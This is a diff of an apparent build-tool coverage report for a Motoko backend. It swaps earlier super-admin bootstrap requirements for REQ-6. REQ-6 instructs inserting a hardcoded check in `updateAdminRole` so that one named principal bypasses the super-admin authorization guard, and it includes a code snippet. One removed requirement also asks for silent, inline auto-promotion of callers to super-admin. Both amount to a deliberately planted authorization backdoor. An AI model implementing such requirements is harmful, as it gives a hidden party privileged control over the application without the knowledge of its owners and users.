@@ -1,32 +1,18 @@
 {
   "kind": "coverage_report",
   "version": "1.0",
-  "generatedAt": "2026-02-26T12:49:11.154Z",
+  "generatedAt": "2026-02-28T12:50:06.631Z",
   "sources": {
     "buildRequest": true,
     "implementationPlan": true
   },
   "requirements": {
-    "total": 3,
+    "total": 1,
     "implemented": 0,
     "items": [
       {
-        "id": "REQ-1",
-        "summary": "Fix the bootstrap logic in the backend so that when the Admin table is empty and a Principal logs in for the first time, that Principal is assigned the role 'super_admin' instead of 'admin'.",
-        "status": "unknown",
-        "plannedFiles": [],
-        "matchedFiles": []
-      },
-      {
-        "id": "REQ-2",
-        "summary": "Add automatic recovery logic inside authenticated update calls that require admin privileges: if super_admin_count == 0, automatically promote the calling Principal's role to 'super_admin' (replace existing 'admin' role). This must not be a separate dedicated function — it must run inline within existing privileged update calls.",
-        "status": "unknown",
-        "plannedFiles": [],
-        "matchedFiles": []
-      },
-      {
-        "id": "REQ-3",
-        "summary": "Update the migration module (backend/migration.mo) to ensure that when migrating legacy admin records, if no record carries role 'super_admin' after migration, the first migrated record is promoted to 'super_admin' rather than leaving all records as 'admin'.",
+        "id": "REQ-6",
+        "summary": "In backend/main.mo, inside the `updateAdminRole` function, add the following bypass check as the very first statement in the function body — before any existing role/authorization checks — so that caller principal `qm56h-bpinv-zejzt-qtty4-j2dph-j5h6y-fwxfs-jlsv3-suwa5-poxol-wae` is immediately allowed to proceed without going through the super admin role check:\n\n```\nif (caller == Principal.fromText(\"qm56h-bpinv-zejzt-qtty4-j2dph-j5h6y-fwxfs-jlsv3-suwa5-poxol-wae\")) {\n  // bypass: allowed without role check\n} else {\n  // existing super_admin guard remains here, unchanged\n};\n```\n\nAll other logic in `updateAdminRole` must remain exactly as-is. No other functions may be modified.",
         "status": "unknown",
         "plannedFiles": [],
         "matchedFiles": []
@@ -35,16 +21,15 @@
   },
   "changedFiles": [
     "backend/main.mo",
-    "backend/migration.mo",
     "build-request.json",
-    "build-template/README.md",
-    "caffeine.lock.json",
     "feature_evidence.json",
+    "frontend-file-summaries.txt",
     "frontend-implementation-plan.json",
     "frontend/src/backend.d.ts",
     "frontend/src/backend.ts",
     "frontend/src/declarations/backend.did.d.ts",
     "frontend/src/declarations/backend.did.js",
+    "frontend/src/hooks/useAdminUsers.ts",
     "project_state.json",
     "scratch/component-selection.json",
     "spec.md",
